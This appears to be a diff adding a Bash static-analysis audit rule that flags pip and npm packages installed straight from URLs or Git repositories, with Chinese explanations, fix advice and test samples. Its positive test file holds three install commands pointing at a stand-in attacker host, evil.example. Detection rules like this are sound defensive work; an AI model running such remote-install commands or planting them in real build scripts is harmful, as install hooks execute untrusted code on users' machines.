@@ -1,0 +1,62 @@
+desc(
+	mode: "ssa"
+	language: "bash"
+	title: "Bash: package installed from URL or Git source"
+	title_zh: "Bash：从 URL 或 Git 源直接安装软件包"
+	type: audit
+	level: "middle"
+	rule_id: "bash-untrusted-package-source"
+	risk: "command-execution"
+	desc: <<<DESC
+### 说明
+`pip install https://...`、`pip install git+https://...`、`npm install
+git+https://...` 会从构建脚本或安装钩子执行远端代码。依赖源没有经过包仓库
+的签名与审核，攻击者可以替换包内容或在 `setup.py`/`postinstall` 中植入
+恶意逻辑。
+DESC
+	solution: <<<SOLUTION
+### 修复建议
+优先使用受信任的包仓库和锁定版本/哈希。必须从 Git 安装时，固定到不可变的
+commit，并在安装前审查构建脚本。生产环境使用私有镜像和依赖代理。
+SOLUTION
+	reference: <<<REFERENCE
+[CWE-829](https://cwe.mitre.org/data/definitions/829.html)
+REFERENCE
+	alert_min: 1
+	"file://pos.sh": <<<POS
+pip install https://evil.example/package.tar.gz
+pip3 install git+https://evil.example/repo.git
+npm install git+https://evil.example/repo.git
+POS
+	"safefile://neg.sh": <<<NEG
+pip install requests
+pip3 install -r requirements.txt
+npm install express
+NEG
+)
+
+/^(pip|pip3|pipx)$/ as $pip
+$pip(* as $pipArgs) as $pipCall
+$pipCall?{have: /(^|[^A-Za-z0-9_])install([^A-Za-z0-9_]|$)/} as $pipInstall
+$pipInstall?{any: /https?:\/\//, /git\+/, /\.whl(\s|$)/, /\.tar\.gz(\s|$)/} as $pipRemote
+
+/^(npm|pnpm|yarn)$/ as $npm
+$npm(* as $npmArgs) as $npmCall
+$npmCall?{any: /(^|[^A-Za-z0-9_])install([^A-Za-z0-9_]|$)/, /(^|[^A-Za-z0-9_])add([^A-Za-z0-9_]|$)/} as $npmInstall
+$npmInstall?{any: /https?:\/\//, /git\+/, /git@/, /\.tgz(\s|$)/} as $npmRemote
+
+alert $pipRemote for {
+	level: "middle",
+	title: "Bash: package installed from URL or Git source",
+	title_zh: "Bash：从 URL 或 Git 源直接安装软件包",
+	message: "检测到 pip 从远端 URL/Git 安装，安装钩子可能执行任意代码。",
+	risk: "command-execution",
+}
+
+alert $npmRemote for {
+	level: "middle",
+	title: "Bash: package installed from URL or Git source",
+	title_zh: "Bash：从 URL 或 Git 源直接安装软件包",
+	message: "检测到 npm/pnpm/yarn 从远端 URL/Git 安装。",
+	risk: "command-execution",
+}
